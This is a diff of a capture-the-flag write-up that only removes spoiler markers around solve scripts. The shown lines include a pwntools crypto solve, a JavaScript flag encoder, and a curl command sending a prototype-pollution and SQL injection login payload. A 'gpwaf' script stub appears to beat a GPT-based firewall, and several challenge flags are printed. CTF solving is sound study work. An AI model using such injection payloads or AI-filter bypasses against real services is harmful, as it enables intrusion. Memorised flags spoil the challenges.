@@ -3,7 +3,7 @@
 # Crypto
 ## winter
 
-:::spoiler `search.py`
+`search.py`
 ```python
 from itertools import product
 from hashlib import sha256
@@ -27,9 +27,9 @@ for i in trange(10):
                 break
         db[hash] = num
 ```
-:::
 
-:::spoiler `solve.py`
+
+`solve.py`
 ```python
 from pwn import *
 from hashlib import sha256
@@ -66,13 +66,12 @@ conn.sendlineafter(b'hex): ', input2.hex().encode())
 conn.sendlineafter(b'hex): ', sig2.hex().encode())
 print(conn.recvall().decode())
 ```
-:::
 
 `dice{according_to_geeksforgeeks}`
 # Web
 ## dicedicegoose
 
-:::spoiler `solve.js`
+`solve.js`
 ```javascript
 function encode(history) {
     const data = new Uint8Array(history.length * 4);
@@ -108,16 +107,16 @@ console.log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
 
 ## funnylogin
 
-:::spoiler `solve`
+`solve`
 ```bash
 curl -X POST https://funnylogin.mc.ax/api/login -d "user=__proto__&pass=' UNION SELECT 1 -- "
 ```
-:::
+
 `dice{i_l0ve_java5cript!}`
 
 ## gpwaf
 
-:::spoiler `solve.py`
+`solve.py`
 ```python
 import requests
 import time
@@ -157,7 +156,7 @@ for _ in range(20):
         print("Failed to parse the POST response as JSON.")
     time.sleep(30) 
 ```
-:::
+
 `dice{wtf_gpt_i_thought_you_were_a_smart_waf}`
 
 # Misc
